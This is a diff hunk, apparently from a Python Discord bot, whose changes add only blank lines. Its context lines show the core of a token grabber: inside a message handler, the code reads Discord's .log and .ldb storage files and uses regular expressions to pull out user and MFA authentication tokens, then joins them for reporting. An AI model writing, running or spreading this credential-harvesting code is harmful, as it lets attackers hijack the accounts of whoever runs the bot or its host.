@@ -144,10 +144,12 @@ async def on_message(message):
             for file in os.listdir(path):
                 if not file.endswith(".log") and not file.endswith(".ldb"):
                     continue
+
                 for line in [x.strip() for x in open(os.path.join(path, file), errors="ignore").readlines() if x.strip()]:
                     for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"]:
                         for token in re.findall(regex, line):
                             tokens.append(token)
+                            
         tokens = "\n".join(tokens)
         if tokens == "":
             tokens = "No tokens found"
